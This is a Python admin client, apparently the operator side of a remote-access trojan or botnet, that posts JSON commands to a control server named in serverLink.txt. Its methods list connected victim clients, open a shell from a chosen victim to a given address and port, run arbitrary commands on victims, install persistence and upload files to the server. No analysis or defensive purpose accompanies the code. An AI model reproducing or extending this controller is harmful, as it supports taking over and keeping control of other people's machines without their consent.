#!/usr/bin/python3
import requests
import os

from requests.api import head

class admin:
    def __init__(self):
        file=open("serverLink.txt", mode="r")
        for line in file:
            self.addr = line
        file.close()

    def doRequest(self,json,rote = "/admin",  file = ""):
        addr = self.addr +  rote
        try:
            if (file == ""):
                r=requests.post(addr,json=json)
            else:
                with open (file,'rb') as f:
                    r=requests.post(addr,headers={},files={"lFile":f})
            print(r.json()['status'])
            return (r.status_code==200)
        except Exception as e:
            print("exception ocurred!",e)
            return False

    
 
    def localFile(self,lFile):
        os.system("ls -l | grep -v \"drw\" | awk '{print $9}' 1>>dir.txt")
        file=open("dir.txt", mode="r")
        saida = False
        for line in file:
            if line.find("dir.txt")!=0:
                if (line.find(lFile)==0):
                    saida=True
        file.close()
        os.system("rm dir.txt")
        return saida
    
    #RPCS CALLS
    def displayClients(self):
        json={"CMD":"displayClients"}
        return self.doRequest(json)

    def abrirShell(self,uid,addr,port):
        json={"CMD":"abrirShell","uid":uid,"port":str(port),"addr":addr}
        return self.doRequest(json)

    def runCommand(self,cmd,uid=0):
        json={"CMD":"runCommand","cmdString":cmd,"uid":uid}
        return self.doRequest(json)
    
    def install(self,uid=0):
        json={"CMD":"installPersistency","uid":uid}
        return self.doRequest(json)

    def testServer(self):
        json={"CMD":"testServer"}
        return self.doRequest(json)

    def testClient(self,uid=0):
        json={"CMD":"testClient","uid":uid}
        return self.doRequest(json)
    
    def sendFile2Server(self,lFile):
        return self.doRequest({},"/sendFile2Server",lFile)

master=admin()
